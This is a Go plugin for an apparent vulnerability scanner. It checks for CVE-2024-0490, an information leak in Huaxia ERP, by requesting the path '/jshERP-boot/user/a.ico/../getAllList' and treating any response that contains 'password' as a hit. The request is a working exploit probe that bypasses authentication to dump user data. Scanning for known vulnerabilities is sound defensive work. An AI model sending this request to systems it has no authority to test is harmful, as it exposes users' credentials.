package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("huaxia_ERP_getAllList_info_leak", &huaxia_ERP_getAllList_info_leak{})
}

type huaxia_ERP_getAllList_info_leak struct{}

func (p *huaxia_ERP_getAllList_info_leak) Info() PluginInfo {
	return PluginInfo{
		Name:     "华夏ERP getAllList信息泄露",
		VulnInfo: "华夏ERP 3.1版本中存在一个问题。该问题影响了文件/user/getAllList的某些未知处理过程。攻击者可以利用此问题导致信息泄露，攻击可以远程发起。",
		VulnID:   "CVE-2024-0490",
		Level:    "5.3 MEDIUM",
		URL:      "https://www.cnblogs.com/bmjoker/p/14856437.html",
		Version:  "Huaxia ERP < 3.2",
		CWE:      "CWE-200	信息暴露",
	}
}

func (p *huaxia_ERP_getAllList_info_leak) Check(netloc string) bool {
	req, err := http.NewRequest("GET", netloc+"/jshERP-boot/user/a.ico/../getAllList", nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "password") {
		return true
	}
	return false
}
